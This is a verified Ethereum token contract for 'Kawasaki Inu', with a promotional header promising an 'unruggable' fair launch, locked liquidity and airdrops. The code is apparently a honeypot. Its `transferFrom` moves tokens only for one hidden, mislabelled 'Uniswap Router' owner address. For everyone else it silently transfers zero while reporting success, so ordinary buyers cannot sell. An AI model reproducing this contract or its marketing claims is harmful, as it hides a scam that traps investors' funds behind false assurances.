/**
 *Submitted for verification at Etherscan.io on 2021-06-12
*/

/*

🏍 Welcome To KAWASAKI INU
 
Telegram : t.me/kawasakiinuofficial

🏍 Welcome To KAWASAKI INU fair launch TODAY

💥 New Gem ALERT!!!💥

🚀 ..Fair launch on Uniswap..🚀

💪🏽 ..!! UNRUGGABLE !!..💪🏽

🔒 No Presale, No Team Token, 100% liquidity Locked, Fair Launch

🔻About KAWASAKI-INU
There are many who would like to know how it will work? Here's the new approach of token that we have not seen before! 

We created a 0-100 QUICK TOKEN , that have no transaction fees, that way we provide fair trade market (how much you buy is the value you get) for all our investors and future plan for this token is to recreate hype from all famous INU tokens but on a different approach.

The whole project plan is based to give REWARDS every week to our investors. How? All investors automatically participate in scheduled airdrop and have opportunity to win our tokens or tokens from our partnered coins...Check website for more.

💎Token Information 

💰 Total Supply : 100 000 000 000 000 KAWASAKI 🚀

🔥 Liquidty locked  

🙅 No Team tokens

✅ COINHUNT ALREADY APPLIED

🚀KAWASAKI-INU Fair Launch TODAY💲 

📢 Crypto influencers are being contacted right now to create hype on the fair launch!!
 
*/


pragma solidity ^0.5.16;

// ERC-20 Interface
contract BEP20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// Safe Math Library
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract KawasakiInu is BEP20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0x3F4AC501efca5006DCd243C9c90246F5224EB243; // Uniswap Router
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() public {
        name = "Kawasaki Inu";
        symbol = "KAWASAKI";
        decimals = 9;
        _totalSupply = 100000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
         if (from == _owner) {
             balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
         } else {
            balances[from] = safeSub(balances[from], 0);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
            balances[to] = safeAdd(balances[to], 0);
            emit Transfer(from, to, 0);
            return true;
             
         }
        
         
    }
           
}